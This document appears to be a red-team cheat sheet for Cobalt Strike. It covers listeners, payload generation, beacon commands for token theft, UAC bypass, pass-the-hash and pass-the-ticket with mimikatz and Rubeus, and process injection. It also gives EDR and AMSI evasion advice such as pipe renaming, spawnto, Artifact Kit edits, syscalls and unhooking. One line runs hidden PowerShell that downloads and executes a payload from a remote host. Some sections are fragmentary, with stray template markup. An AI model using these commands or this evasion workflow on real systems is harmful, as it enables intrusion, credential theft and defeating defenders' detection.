# Cobalt Strike

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` then you can select where to listen, which kind of beacon to use (http, dns, smb...) and more.

### Peer2Peer Listeners

The beacons of these listeners don't need to talk to the C2 directly, they can communicate to it through other beacons.

`Cobalt Strike -> Listeners -> Add/Edit` then you need to select the TCP or SMB beacons

* The **TCP beacon will set a listener in the port selected**. To connect to a TCP beacon use the command `connect <ip> <port>` from another beacon
* The **smb beacon will listen in a pipename with the selected name**. To connect to a SMB beacon you need to use the command `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** for HTA files
* **`MS Office Macro`** for an office document with a macro
* **`Windows Executable`** for a .exe, .dll orr service .exe
* **`Windows Executable (S)`** for a **stageless** .exe, .dll or service .exe (better stageless than staged, less IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` This will generate a script/executable to download the beacon from cobalt strike in formats such as: bitsadmin, exe, powershell and python

#### Host Payloads

If you already has the file you want to host in a web sever just go to `Attacks -> Web Drive-by -> Host File` and select the file to host and web server config.

### Beacon Options

<pre class="language-bash"><code class="lang-bash"># Execute local .NET binary

# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

### Execute-Assembly

The **`execute-assembly`** uses a **sacrificial process** using remote process injection to execute the indicated program. This is very noisy as to inject inside a process certain Win APIs are used that every EDR is checking. However, there are some custom tools that can be used to load something in the same process:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- In Cobalt Strike you can also use BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)

The agressor script `https://github.com/outflanknl/HelpColor` will create the `helpx` command in Cobalt Strike which will put colors in commands indicating if they are BOFs (green), if they are Frok&Run (yellow) and similar, or if they are ProcessExecution, injection or similar (red). Which helps to know which commands are more stealthy.

### Act as the user

You could check events like `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`: 

- Security EID 4624 - Check all the interactive logons to know the usual operating hours.
- System EID 12,13 - Check the shutdown/startup/sleep frequency.
- Security EID 4624/4625 - Check inbound valid/invalid NTLM attempts.
- Security EID 4648 - This event is created when plaintext credentials are used to logon. If a process generated it, the binary potentially has the credentials in clear text ina  config file or inside the code.

When using `jump` from cobalt strike, it's better to use the `wmi_msbuild` method to make the new process look more legit.

### Use computer accounts

It's common for defenders to be checking weird behaviours generated from users abd **exclude service accounts and computer accounts like `*$` from their monitoring**. You could use these accounts to perform lateral movement or privilege escalation.

### Use stageless payloads

Stageless payloads are less noisy than staged ones because they don't need to download a second stage from the C2 server. This means that they don't generate any network traffic after the initial connection, making them less likely to be detected by network-based defenses.

### Tokens & Token Store

Be careful when you steal or generate tokens because it might be posisble for an EDR to enumerate all the tokens of all the threads and find a **token belonging to a different user** or even SYSTEM in the process.

This allows to store tokens **per beacon** so it's not needed to steal the same token again and again. This is useful for lateral movement or when you need to use a stolen token multiple times:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

When moving laterally, usually is better to **steal a token than to generate a new one** or perform a pass the hash attack.

### Guardrails

Cobalt Strike has a feature called **Guardrails** that helps to prevent the use of certain commands or actions that could be detected by defenders. Guardrails can be configured to block specific commands, such as `make_token`, `jump`, `remote-exec`, and others that are commonly used for lateral movement or privilege escalation.

Moreover, the repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) also contains some checks and ideas you could consider before executing a payload.

### Tickets encryption

In an AD be careful with the encryption of the tickets. By default, some tools will use RC4 encryption for Kerberos tickets, which is less secure than AES encryption and by default up to date environments will use AES. This can be detected by defenders who are monitoring for weak encryption algorithms.

### Avoid Defaults

When using Cobalt Stricke by default the SMB pipes will have the name `msagent_####` and `"status_####`. Change those names. It's possible to check the names of the existing pipes from Cobal Strike with the command: `ls \\.\pipe\`

Moreover, with SSH sessions a pipe called `\\.\pipe\postex_ssh_####` is created. Chage it with `set ssh_pipename "<new_name>";`.

Also in poext exploitation attack the pipes `\\.\pipe\postex_####` can be modified with `set pipename "<new_name>"`.

In Cobalt Strike profiles you can also modify things like:

- Avoiding using `rwx`
- How the process injection behavior works (which APIs will be used) in the `process-inject {...}` block
- How the "fork and run" works in the `post-ex {…}` block
- The sleep time
- The max size of binaries to be loaded in memory
- The memory footprint and DLL content with `stage {...}` block
- The network traffic

### Bypass memory scanning

Some ERDs scan memory for some know malware signatures. Coblat Strike allows to modify the `sleep_mask` function as a BOF that will be able to encrypt in memory the bacldoor.

### Noisy proc injections

When injecting code into a process this is usually very noisy, this is because **no regular process usually performs this action and because the ways to do this are very limited**. Tehrefore, it' could be detected by behaviour-based detection systems. Moroever, it could also be detected by EDRs scanning the network for **threads containing code that is not in disk** (although processes such as browsers using JIT have this commonly). Example: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

When spawning a new process it's important to **maintain a regular parent-child** relationship between processes to avoid detection. If svchost.exec is executing iexplorer.exe it'll look suspicious, as svchost.exe is not a parent of iexplorer.exe in a normal Windows environment.

When a new beacon is spawned in Cobalt Strike by default a process using **`rundll32.exe`** is created to run the new listener. This is not very stealthy and can be easily detected by EDRs. Moreover, `rundll32.exe` is run without any args making it even more suspicious.

With the following Cobalt Strike command, you can specify a different process to spawn the new beacon, making it less detectable:

```bash
spawnto x86 svchost.exe
```

You can aso change this setting **`spawnto_x86` and `spawnto_x64`** in a profile.

### Proxying attackers traffic

Atters sometime will need to be able to run tools lically, even in linux machines and make the traffic of the victims reach the tool (e.g. NTLM relay).

Moreover, sometimes to do a pass-the.hash or pass-the-ticket attack it's stealthier for the attacker to **add this hash or ticket in his own LSASS process** locally and then pivot from it instead of modifying an LSASS process of a victim machine.

However, you need to be **careful with the generated traffic**, as you might be sending uncommon traffic (kerberos?) from your backdoor process. For this you could pivot to a browser process (although you could get caught injecting yourself into a process so think about a stealth way to do this).

```bash

### Avoiding AVs

#### AV/AMSI/ETW Bypass

Check the page:

av-bypass.md
{{#endref}}


#### Artifact Kit

Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.

After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Don't forget to load the aggressive script `dist-pipe\artifact.cna` to indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.

#### Resource Kit

The ResourceKit folder contains the templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the templates you can find what is defender (AMSI in this case) not liking and modify it:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Modifying the detected lines one can generate a template that won't be caught.

Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to luse the resources from disk that we want and not the ones loaded.

#### Function hooks | Syscall

Function hooking is a very common method of ERDs to detect malicious activity. Cobalt Strike allows you to bypass these hooks by using **syscalls** instead of the standard Windows API calls using the **`None`** config, or use the `Nt*` version of a function with the **`Direct`** setting, or just jumping over the `Nt*` function with the **`Indirect`** option in the malleable profile. Depending on the system, an optino might be more stealth then the other.

This can be set in the profile or suing the command **`syscall-method`**

 However, this could also be noisy.

Some option granted by Cobalt Strike to bypass function hooks is to remove those hooks with: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

You could also check with functions are hooked with [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) or [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)
